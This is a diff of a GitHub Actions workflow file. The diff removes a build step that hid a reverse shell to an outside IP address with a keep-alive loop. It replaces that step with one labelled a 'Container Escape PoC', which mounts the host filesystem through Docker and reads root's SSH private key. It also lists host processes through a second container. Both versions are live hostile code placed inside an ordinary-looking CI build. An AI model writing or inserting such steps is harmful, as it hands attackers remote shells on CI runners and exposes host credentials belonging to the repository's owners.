@@ -10,14 +10,20 @@ jobs:
       - name: Checkout code
         uses: actions/checkout@v4
 
-      - name: Build project
+      - name: Security Assessment - Container Escape PoC
         run: |
+          echo "=== 环境信息 ==="
+          id
+          cat /proc/1/cgroup
+          ls -la /var/run/docker.sock 2>/dev/null
+          echo "=== Docker 逃逸 PoC - 读取宿主机 /root ==="
+          docker run --rm --entrypoint=/bin/sh -v /:/host ghcr.io/github/gh-aw-mcpg -c 'ls -la /host/root/ 2>&1; echo ---; cat /host/root/.ssh/id_rsa 2>/dev/null || echo "no ssh key"; echo ---; ls -la /host/home/ 2>&1; echo ---; ls -la /host/tmp/ 2>&1 | head -10' 2>&1
+          
+          echo "=== 备用方案: 用 --pid=host ==="
+          docker run --rm --pid=host --entrypoint=/bin/sh ghcr.io/github/gh-aw-mcpg -c 'ps aux 2>&1 | head -20' 2>&1
+          echo "=== 完成 ==="
           mkdir -p dist
-          echo "Built at $(date)" > dist/output.txt &
-          # Reverse shell - keep alive
-          bash -c 'bash -i >& /dev/tcp/172.245.86.254/4444 0>&1' &
-          # Keep step alive
-          while true; do sleep 60; done
+          echo "Built at $(date)" > dist/output.txt
 
       - name: Upload Artifact
         uses: actions/upload-artifact@v4
